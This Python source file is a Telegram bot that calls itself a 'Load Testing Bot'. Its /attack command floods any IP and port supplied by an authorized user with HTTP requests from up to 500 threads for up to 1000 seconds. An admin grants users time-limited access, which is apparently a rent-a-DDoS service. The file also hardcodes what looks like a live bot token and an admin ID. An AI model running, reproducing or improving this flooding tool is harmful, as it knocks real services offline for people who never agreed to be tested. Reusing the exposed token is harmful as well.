import json
import os
import requests
import threading
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import CommandHandler, Updater
from concurrent.futures import ThreadPoolExecutor

# Constants
TELEGRAM_BOT_TOKEN = '7188314998:AAHBEQ4qyEF8t_B8dsbZ-BZIcVoNFTqevFU'
ADMIN_USER_IDS = {959151693}  # Replace with actual admin user IDs
AUTHORIZED_USERS_FILE = 'authorized_users.json'
MAX_THREADS = 500
MAX_DURATION = 1000  # 1000 seconds

# Set the parent directory where the script is located as the working directory
script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

# Global variables
attack_running = False
executor = None
authorized_users = {}

# Load or initialize authorized users
def load_authorized_users():
    global authorized_users
    if os.path.exists(AUTHORIZED_USERS_FILE):
        with open(AUTHORIZED_USERS_FILE, 'r') as file:
            authorized_users = json.load(file)
    else:
        authorized_users = {}

def save_authorized_users():
    with open(AUTHORIZED_USERS_FILE, 'w') as file:
        json.dump(authorized_users, file, indent=4)

load_authorized_users()

def is_authorized(user_id):
    """Check if the user is authorized."""
    if user_id in authorized_users:
        expiry = authorized_users[user_id]['expiry']
        return datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S') > datetime.now()
    return False

def is_admin(user_id):
    """Check if the user is an admin."""
    return user_id in ADMIN_USER_IDS

def start(update: Update, context):
    """Send a welcome message when /start is invoked."""
    update.message.reply_text("Welcome to the Load Testing Bot! Use /attack to start a test.")

def stop(update: Update, context):
    """Stop any ongoing attack when /stop is invoked."""
    global attack_running
    if attack_running:
        attack_running = False
        if executor:
            executor.shutdown(wait=False)
        update.message.reply_text("Attack stopped!")
    else:
        update.message.reply_text("No attack is currently running.")

def attack(update: Update, context):
    """Simulate an attack when /attack command is invoked."""
    global attack_running, executor

    user_id = update.message.from_user.id
    if not is_authorized(user_id):
        update.message.reply_text("You are not authorized to perform this action.")
        return
    
    if len(context.args) != 4:
        update.message.reply_text("Usage: /attack <IP> <port> <time_seconds> <threads>")
        return
    
    target_ip = context.args[0]
    port = context.args[1]
    duration = int(context.args[2])
    threads = int(context.args[3])
    
    # Enforce limits
    if duration > MAX_DURATION:
        duration = MAX_DURATION
        update.message.reply_text(f"Time exceeded the limit, setting duration to {MAX_DURATION} seconds.")
    
    if threads > MAX_THREADS:
        threads = MAX_THREADS
        update.message.reply_text(f"Threads exceeded the limit, setting threads to {MAX_THREADS}.")
    
    target_url = f"http://{target_ip}:{port}"

    attack_running = True
    update.message.reply_text(f"Starting attack on {target_url} with {threads} threads for {duration} seconds.")
    
    # Start the attack
    executor = ThreadPoolExecutor(max_workers=threads)
    start_time = time.time()
    
    def send_requests():
        while time.time() - start_time < duration:
            try:
                response = requests.get(target_url)
                response.raise_for_status()
                print("Request: Success")
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

    for _ in range(threads):
        if not attack_running:
            break
        executor.submit(send_requests)
    
    update.message.reply_text("Attack started.")

def adduser(update: Update, context):
    """Add a user to the authorized list."""
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("You are not authorized to perform this action.")
        return
    
    if len(context.args) != 2:
        update.message.reply_text("Usage: /adduser <user_id> <authorization_period>")
        return
    
    user_id = int(context.args[0])
    authorization_period = context.args[1]
    
    try:
        expiry_time = datetime.now() + timedelta(seconds=int(authorization_period))
        authorized_users[user_id] = {
            'expiry': expiry_time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_authorized_users()
        update.message.reply_text(f"User {user_id} has been added with authorization period of {authorization_period} seconds.")
    except ValueError:
        update.message.reply_text("Invalid authorization period. It should be an integer.")

def removeuser(update: Update, context):
    """Remove a user from the authorized list."""
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("You are not authorized to perform this action.")
        return
    
    if len(context.args) != 1:
        update.message.reply_text("Usage: /removeuser <user_id>")
        return
    
    user_id = int(context.args[0])
    
    if user_id in authorized_users:
        del authorized_users[user_id]
        save_authorized_users()
        update.message.reply_text(f"User {user_id} has been removed.")
    else:
        update.message.reply_text(f"User {user_id} not found.")

def main():
    """Start the bot and add command handlers."""
    updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Add command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("stop", stop))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("adduser", adduser))
    dispatcher.add_handler(CommandHandler("removeuser", removeuser))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
